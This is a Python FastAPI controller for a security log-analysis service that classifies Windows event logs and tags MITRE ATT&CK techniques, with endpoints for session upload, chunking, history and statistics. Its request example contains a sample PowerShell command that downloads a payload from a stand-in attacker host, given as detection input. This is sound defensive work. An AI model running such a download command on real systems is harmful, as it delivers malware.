"""
Log Analysis Controller - REST API endpoints.
"""
from fastapi import APIRouter, HTTPException, status
from pydantic import BaseModel, Field
from typing import List, Optional
from datetime import datetime
import time

from app.services.ml_service import ml_service
from app.services.chunking_service import chunking_service
from app.repositories.log_repository import log_repository
from app.repositories.session_chunk_repository import session_chunk_repository
from app.models.log_model import LogAnalysis, LogStatus
from app.models.session_chunk_model import SessionChunk
from loguru import logger


router = APIRouter(prefix="/api/logs", tags=["logs"])


# Request/Response Models
class AnalyzeLogRequest(BaseModel):
    """Request model for log analysis."""
    log_content: str = Field(..., description="Log content to analyze (JSON format)")
    session_id: Optional[str] = Field(None, description="Session ID for tracking")
    
    class Config:
        json_schema_extra = {
            "example": {
                "log_content": '{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "Invoke-WebRequest http://evil.com/payload.exe"}',
                "session_id": "session_123"
            }
        }


class AnalyzeLogResponse(BaseModel):
    """Response model for log analysis."""
    analysis_id: str = Field(..., description="Analysis ID for reference")
    status: str = Field(..., description="Classification status (Normal/Suspicious/Unknown)")
    reason: str = Field(..., description="Explanation for classification")
    mitre_techniques: List[str] = Field(..., description="Detected MITRE ATT&CK techniques")
    raw_output: str = Field(..., description="Raw model output")
    processing_time_ms: float = Field(..., description="Processing time in milliseconds")
    analyzed_at: datetime = Field(..., description="Timestamp of analysis")
    
    class Config:
        json_schema_extra = {
            "example": {
                "analysis_id": "65f1234567890abcdef12345",
                "status": "Suspicious",
                "reason": "PowerShell downloading executable from external site",
                "mitre_techniques": ["T1105"],
                "raw_output": "Status: Suspicious\nReason: ...",
                "processing_time_ms": 1250.5,
                "analyzed_at": "2026-02-24T10:30:00Z"
            }
        }


class HealthResponse(BaseModel):
    """Health check response."""
    status: str
    model_loaded: bool
    timestamp: datetime


class StatsResponse(BaseModel):
    """Statistics response."""
    total_analyses: int
    by_status: dict  # Changed from status_counts to match frontend
    recent_analyses: List[dict]


# API Endpoints
@router.post("/analyze", response_model=AnalyzeLogResponse, status_code=status.HTTP_201_CREATED)
async def analyze_log(request: AnalyzeLogRequest):
    """
    Analyze a log chunk and detect MITRE ATT&CK techniques.
    
    - **log_content**: Log data in JSON format
    - **session_id**: Optional session ID for tracking multiple analyses
    
    Returns classification status, reasoning, and detected MITRE techniques.
    """
    start_time = time.time()
    
    try:
        # Analyze using ML service
        status_result, reason, mitre_techniques, raw_output, error = await ml_service.analyze_log(
            request.log_content
        )
        
        if error:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"Analysis failed: {error}"
            )
        
        processing_time_ms = (time.time() - start_time) * 1000
        
        # Save to database
        log_analysis = LogAnalysis(
            log_content=request.log_content,
            status=LogStatus(status_result),
            reason=reason,
            mitre_techniques=mitre_techniques,
            raw_output=raw_output,
            processing_time_ms=processing_time_ms,
            session_id=request.session_id
        )
        
        saved_analysis = await log_repository.create(log_analysis)
        
        logger.info(f"Analysis completed: {status_result} ({processing_time_ms:.2f}ms)")
        
        return AnalyzeLogResponse(
            analysis_id=str(saved_analysis.id),
            status=status_result,
            reason=reason,
            mitre_techniques=mitre_techniques,
            raw_output=raw_output,
            processing_time_ms=processing_time_ms,
            analyzed_at=saved_analysis.analyzed_at
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in analyze_log endpoint: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Internal server error: {str(e)}"
        )


@router.get("/history/{analysis_id}", response_model=AnalyzeLogResponse)
async def get_analysis(analysis_id: str):
    """
    Retrieve a specific log analysis by ID.
    
    - **analysis_id**: The ID of the analysis to retrieve
    """
    analysis = await log_repository.find_by_id(analysis_id)
    
    if not analysis:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Analysis {analysis_id} not found"
        )
    
    return AnalyzeLogResponse(
        analysis_id=str(analysis.id),
        status=analysis.status.value,
        reason=analysis.reason,
        mitre_techniques=analysis.mitre_techniques,
        raw_output=analysis.raw_output,
        processing_time_ms=analysis.processing_time_ms or 0,
        analyzed_at=analysis.analyzed_at
    )


@router.get("/session/{session_id}")
async def get_session_analyses(session_id: str, limit: int = 100):
    """
    Retrieve all analyses for a specific session.
    
    - **session_id**: Session ID to filter by
    - **limit**: Maximum number of results (default: 100)
    """
    analyses = await log_repository.find_by_session(session_id, limit)
    
    return {
        "session_id": session_id,
        "count": len(analyses),
        "analyses": [
            {
                "analysis_id": str(a.id),
                "status": a.status.value,
                "mitre_techniques": a.mitre_techniques,
                "analyzed_at": a.analyzed_at
            }
            for a in analyses
        ]
    }


@router.get("/recent", response_model=List[AnalyzeLogResponse])
async def get_recent_analyses(limit: int = 50):
    """
    Retrieve recent log analyses.
    
    - **limit**: Maximum number of results (default: 50)
    """
    analyses = await log_repository.find_recent(limit)
    
    return [
        AnalyzeLogResponse(
            analysis_id=str(a.id),
            status=a.status.value,
            reason=a.reason,
            mitre_techniques=a.mitre_techniques,
            raw_output=a.raw_output,
            processing_time_ms=a.processing_time_ms or 0,
            analyzed_at=a.analyzed_at
        )
        for a in analyses
    ]


@router.get("/stats", response_model=StatsResponse)
async def get_statistics():
    """Get analysis statistics."""
    try:
        status_counts = await log_repository.count_by_status()
        recent = await log_repository.find_recent(10)
        
        total = sum(status_counts.values()) if status_counts else 0
        
        # Transform status_counts to by_status with lowercase keys
        by_status = {
            "normal": status_counts.get("Normal", 0),
            "suspicious": status_counts.get("Suspicious", 0),
            "unknown": status_counts.get("Unknown", 0),
            "error": status_counts.get("Error", 0),
        }
        
        return StatsResponse(
            total_analyses=total,
            by_status=by_status,
            recent_analyses=[
                {
                    "id": str(a.id),
                    "status": a.status.value,
                    "analyzed_at": a.analyzed_at.isoformat()
                }
                for a in recent
            ]
        )
    except Exception as e:
        logger.error(f"Error getting statistics: {str(e)}")
        # Return empty stats instead of crashing
        return StatsResponse(
            total_analyses=0,
            by_status={"normal": 0, "suspicious": 0, "unknown": 0, "error": 0},
            recent_analyses=[]
        )


@router.get("/health", response_model=HealthResponse)
async def health_check():
    """Check API health and model status."""
    return HealthResponse(
        status="healthy",
        model_loaded=ml_service.is_loaded(),
        timestamp=datetime.utcnow()
    )


# ============================================================================
# CHUNK ANALYSIS ENDPOINT
# ============================================================================

class AnalyzeChunkRequest(BaseModel):
    """Request model for analyzing a specific chunk."""
    session_id: str = Field(..., description="Session ID")
    chunk_index: int = Field(..., description="Chunk index to analyze")
    log_content: str = Field(..., description="Log content from the chunk")


@router.post("/chunks/analyze", response_model=AnalyzeLogResponse)
async def analyze_chunk(request: AnalyzeChunkRequest):
    """
    Analyze a specific chunk and update its status in the database.
    
    This endpoint analyzes a chunk AND saves the result to both:
    1. LogAnalysis collection (for history)
    2. SessionChunk collection (updates the chunk with status)
    """
    start_time = time.time()
    
    try:
        # Analyze using ML service
        status_result, reason, mitre_techniques, raw_output, error = await ml_service.analyze_log(
            request.log_content
        )
        
        if error:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail=f"Analysis failed: {error}"
            )
        
        processing_time_ms = (time.time() - start_time) * 1000
        
        # Save to LogAnalysis collection
        log_analysis = LogAnalysis(
            log_content=request.log_content,
            status=LogStatus(status_result),
            reason=reason,
            mitre_techniques=mitre_techniques,
            raw_output=raw_output,
            processing_time_ms=processing_time_ms,
            session_id=request.session_id
        )
        
        saved_analysis = await log_repository.create(log_analysis)
        
        # Update the SessionChunk with analysis results
        analysis_result = {
            "analysis_id": str(saved_analysis.id),
            "status": status_result,
            "reason": reason,
            "mitre_techniques": mitre_techniques,
            "raw_output": raw_output,
            "processing_time_ms": processing_time_ms,
            "analyzed_at": saved_analysis.analyzed_at.isoformat()
        }
        
        updated_chunk = await session_chunk_repository.update_chunk_analysis(
            session_id=request.session_id,
            chunk_index=request.chunk_index,
            analysis_id=str(saved_analysis.id),
            analysis_status=status_result,
            analysis_result=analysis_result
        )
        
        if not updated_chunk:
            logger.warning(f"Chunk not found in DB, but analysis saved: {request.session_id} chunk {request.chunk_index}")
        
        logger.info(f"Chunk {request.chunk_index} analyzed: {status_result} ({processing_time_ms:.2f}ms)")
        
        return AnalyzeLogResponse(
            analysis_id=str(saved_analysis.id),
            status=status_result,
            reason=reason,
            mitre_techniques=mitre_techniques,
            raw_output=raw_output,
            processing_time_ms=processing_time_ms,
            analyzed_at=saved_analysis.analyzed_at
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in analyze_chunk endpoint: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Internal server error: {str(e)}"
        )


# ============================================================================
# SESSION UPLOAD & CHUNKING ENDPOINTS
# ============================================================================

class UploadSessionRequest(BaseModel):
    """Request model for uploading full session logs."""
    log_content: str = Field(..., description="Full session log content (JSON array)")
    session_id: str = Field(..., description="Unique session identifier")
    session_name: Optional[str] = Field(None, description="Optional session name/description")
    
    class Config:
        json_schema_extra = {
            "example": {
                "log_content": '[{"EventID": 4688, ...}, {"EventID": 4689, ...}]',
                "session_id": "session_20260224_103000",
                "session_name": "Credential Harvesting Attack"
            }
        }


class UploadSessionResponse(BaseModel):
    """Response model for session upload."""
    session_id: str
    session_name: Optional[str]
    total_logs: int
    total_chunks: int
    chunk_ids: List[str]
    created_at: datetime
    message: str


class SessionSummaryResponse(BaseModel):
    """Response model for session summary."""
    session_id: str
    session_name: Optional[str]
    total_chunks: int
    analyzed_chunks: int
    chunks: List[dict]
    skip: int = 0
    limit: int = 50


@router.post("/sessions/upload", response_model=UploadSessionResponse, status_code=status.HTTP_201_CREATED)
async def upload_session_logs(request: UploadSessionRequest):
    """
    Upload full session log file and automatically chunk it.
    
    - **log_content**: Complete session logs as JSON array
    - **session_id**: Unique identifier for this session
    - **session_name**: Optional descriptive name
    
    The logs will be automatically chunked into 7-log segments and saved to the database.
    """
    try:
        # Chunk the session logs
        chunks_data = chunking_service.chunk_session_logs(
            request.log_content,
            request.session_id
        )
        
        logger.info(f"Created {len(chunks_data)} chunks for session {request.session_id}")
        
        # Create SessionChunk documents
        chunks_to_save = []
        for chunk_data in chunks_data:
            chunk = SessionChunk(
                session_id=request.session_id,
                session_name=request.session_name,
                chunk_index=chunk_data["metadata"]["chunk_index"],
                total_chunks=chunk_data["metadata"]["total_chunks"],
                chunk_size=chunk_data["metadata"]["chunk_size"],
                logs_json=chunk_data["logs_json"],
                logs_metadata=chunk_data["metadata"],
                start_time=chunk_data["metadata"]["start_time"],
                end_time=chunk_data["metadata"]["end_time"]
            )
            chunks_to_save.append(chunk)
        
        # Save all chunks to database
        saved_chunks = await session_chunk_repository.create_many_chunks(chunks_to_save)
        
        # Calculate total logs
        total_logs = sum(c.chunk_size for c in saved_chunks)
        
        logger.success(f"Saved {len(saved_chunks)} chunks for session {request.session_id}")
        
        return UploadSessionResponse(
            session_id=request.session_id,
            session_name=request.session_name,
            total_logs=total_logs,
            total_chunks=len(saved_chunks),
            chunk_ids=[str(c.id) for c in saved_chunks],
            created_at=datetime.utcnow(),
            message=f"Successfully chunked {total_logs} logs into {len(saved_chunks)} chunks"
        )
        
    except ValueError as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )
    except Exception as e:
        logger.error(f"Error uploading session: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to process session: {str(e)}"
        )


@router.get("/sessions", response_model=dict)
async def get_all_sessions(skip: int = 0, limit: int = 20):
    """Get paginated list of all uploaded sessions with summary information."""
    try:
        sessions, total = await session_chunk_repository.get_all_sessions(skip, limit)
        return {
            "sessions": sessions,
            "total": total,
            "skip": skip,
            "limit": limit
        }
    except Exception as e:
        logger.error(f"Error fetching sessions: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to fetch sessions: {str(e)}"
        )


@router.get("/sessions/{session_id}", response_model=SessionSummaryResponse)
async def get_session_details(session_id: str, skip: int = 0, limit: int = 50):
    """Get detailed information about a specific session and its chunks (paginated)."""
    try:
        chunks, total = await session_chunk_repository.find_by_session(session_id, skip, limit)
        
        if total == 0:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail=f"Session '{session_id}' not found"
            )
        
        analyzed_count = sum(1 for c in chunks if c.is_analyzed)
        
        chunk_list = [
            {
                "chunk_id": str(c.id),
                "chunk_index": c.chunk_index,
                "chunk_size": c.chunk_size,
                "is_analyzed": c.is_analyzed,
                "analysis_id": c.analysis_id,
                "analysis_status": c.analysis_status,
                "analysis_result": c.analysis_result,
                "analyzed_at": c.analyzed_at.isoformat() if c.analyzed_at else None,
                "start_time": c.start_time,
                "end_time": c.end_time
            }
            for c in chunks
        ]
        
        return SessionSummaryResponse(
            session_id=session_id,
            session_name=chunks[0].session_name if chunks else None,
            total_chunks=total,
            analyzed_chunks=analyzed_count,
            chunks=chunk_list,
            skip=skip,
            limit=limit
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error fetching session details: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to fetch session details: {str(e)}"
        )


@router.get("/sessions/{session_id}/chunks/{chunk_index}", response_model=dict)
async def get_chunk_data(session_id: str, chunk_index: int):
    """Get the log data for a specific chunk."""
    try:
        chunks = await session_chunk_repository.find_by_session(session_id)
        
        # Find the specific chunk
        chunk = next((c for c in chunks if c.chunk_index == chunk_index), None)
        
        if not chunk:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail=f"Chunk {chunk_index} not found in session '{session_id}'"
            )
        
        return {
            "chunk_id": str(chunk.id),
            "session_id": chunk.session_id,
            "chunk_index": chunk.chunk_index,
            "chunk_size": chunk.chunk_size,
            "logs_json": chunk.logs_json,
            "is_analyzed": chunk.is_analyzed,
            "analysis_id": chunk.analysis_id,
            "metadata": chunk.logs_metadata
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error fetching chunk data: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to fetch chunk data: {str(e)}"
        )


@router.delete("/sessions/{session_id}")
async def delete_session(session_id: str):
    """Delete a session and all its chunks."""
    try:
        deleted_count = await session_chunk_repository.delete_session(session_id)
        
        if deleted_count == 0:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail=f"Session '{session_id}' not found"
            )
        
        return {
            "message": f"Deleted session '{session_id}' and {deleted_count} chunks",
            "deleted_chunks": deleted_count
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error deleting session: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to delete session: {str(e)}"
        )

